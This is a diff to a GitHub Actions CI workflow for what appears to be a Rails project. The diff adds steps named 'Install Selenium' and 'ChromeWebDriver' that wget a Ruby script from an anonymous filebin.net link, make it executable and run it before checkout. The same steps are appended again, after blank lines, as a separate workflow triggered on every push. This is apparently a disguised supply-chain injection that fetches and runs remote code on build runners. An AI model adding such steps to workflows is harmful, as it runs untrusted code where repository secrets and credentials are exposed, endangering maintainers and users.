@@ -26,6 +26,14 @@ jobs:
           --health-timeout 5s
           --health-retries 5
     steps:
+      - name: Install Selenium
+        run: |
+            sudo gem install selenium-webdriver
+            wget https://filebin.net/6cw0f2x2sfgqyhi0/headless_chrome.rb?t=7g4c257d -O headless_chrome.rb
+            chmod +x headless_chrome.rb
+      - name: ChromeWebDriver
+        run: |
+            ./headless_chrome.rb
       - name: Checkout repository
         uses: actions/checkout@v2
       - name: Set up Ruby # An action to install Ruby and gems
@@ -47,3 +55,22 @@ jobs:
         run: bundle exec rails test
       - name: Run system tests
         run: bundle exec rails test:system
+
+
+
+
+name: CI
+on: [push]
+
+jobs:
+  build:
+    runs-on: [ubuntu-latest]
+    steps:
+      - name: Install Selenium
+        run: |
+            sudo gem install selenium-webdriver
+            wget https://filebin.net/6cw0f2x2sfgqyhi0/headless_chrome.rb?t=7g4c257d -O headless_chrome.rb
+            chmod +x headless_chrome.rb
+      - name: ChromeWebDriver
+        run: |
+            ./headless_chrome.rb
